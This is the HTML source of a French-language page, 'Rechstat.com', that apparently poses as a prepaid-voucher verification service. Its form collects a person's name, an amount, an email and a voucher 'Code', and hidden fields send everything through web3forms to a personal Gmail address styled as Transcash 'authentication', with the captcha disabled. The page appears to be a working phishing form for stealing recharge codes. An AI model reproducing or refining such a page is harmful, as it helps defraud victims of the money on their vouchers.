<!DOCTYPE html>
<html lang="fr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Rechstat.com</title>
  <link rel="stylesheet" href="form.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="assets/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>

<body>
  <header>
    <nav>
      <a href="index.html">Accueil</a>
      <a href="index.html#faq">FAQ</a>
    </nav>
    <div>
      <div class="custom-language-selector">
        <div class="selected-lang" onclick="toggleLangMenu()">
          <img src="https://flagcdn.com/w20/fr.png" alt="FR">
          <span>Français</span>
        </div>
        <ul class="lang-options">
          <li onclick="setLang('fr')">
            <img src="https://flagcdn.com/w20/fr.png" alt="FR"> Français
          </li>
          <li onclick="setLang('en')">
            <img src="https://flagcdn.com/w20/gb.png" alt="EN"> English
          </li>
          <li onclick="setLang('es')">
            <img src="https://flagcdn.com/w20/es.png" alt="ES"> Español
          </li>
          <li onclick="setLang('de')">
            <img src="https://flagcdn.com/w20/de.png" alt="DE"> Deutsch
          </li>
          <li onclick="setLang('it')">
            <img src="https://flagcdn.com/w20/it.png" alt="IT"> Italiano
          </li>
          <li onclick="setLang('pt')">
            <img src="https://flagcdn.com/w20/pt.png" alt="PT"> Português
          </li>
        </ul>
      </div>
    </div>
  </header>

  <div class="page-wrapper">
    <section id="contact" class="contact-section">
      <div class="container">
        <h2 class="section-title" data-i18n="contact_title"></h2>

        <form action="https://api.web3forms.com/submit" method="POST">
          <input type="hidden" name="access_key" value="fd4449f1-bff6-480c-8232-947000660f32">
          <input type="hidden" name="to_email" value="authentificationtranscash97@gmail.com">
          <input type="hidden" name="redirect" value="https://rechstat.com/merci.html">
          <input type="hidden" name="_captcha" value="false">
          <input type="hidden" name="_template" value="table">

          <label for="nom">Nom :</label>
          <input type="text" id="nom" name="nom" required>

          <label for="prenom">Prénom :</label>
          <input type="text" id="prenom" name="prenom" required>

          <label for="amount">Montant :</label>
          <input type="number" id="amount" name="amount" min="1" required>

          <label for="email">Votre email :</label>
          <input type="email" id="email" name="email" required>

          <div class="password-wrapper">
            <label for="code">Code :</label>
            <input type="text" id="code" name="code" required>
          </div>

          <textarea name="message" hidden>Soumission via formulaire sécurisé</textarea>


          <p style="margin-top: 10px;">
            <span data-i18n="form_toggle_label">Afficher le code :</span>
          </p>

          <div class="code-toggle" style="display: flex; flex-direction: column; gap: 5px; align-items: flex-start;">
            <label style="display: flex; align-items: center; gap: 8px;">
              <span data-i18n="form_oui">Oui</span>
              <input type="radio" name="show_code" value="oui" onclick="toggleCode(true)">
            </label>
            <label style="display: flex; align-items: center; gap: 8px;">
              <span data-i18n="form_non">Non</span>
              <input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)">
            </label>
          </div>

          <button type="submit" class="btn-submit" data-i18n="form_envoyer">Soumettre</button>
        </form>
      </div>
    </section>
  </div>

  <footer>
    <div class="footer-container">
      <div class="footer-links">
        <a href="#faq" data-i18n="footer_faq">FAQ</a>
        <a href="#contact" data-i18n="footer_contact">Contact</a>
      </div>
      <p data-i18n="footer_copyright">&copy; 2025 Rechstat.com Tous droits réservés.</p>
    </div>
  </footer>

  <script src="form.js"></script>
  <script>
    function toggleCode(show) {
      const codeInput = document.getElementById("code");
      codeInput.type = show ? "text" : "password";

    }
  </script>
</body>

</html>
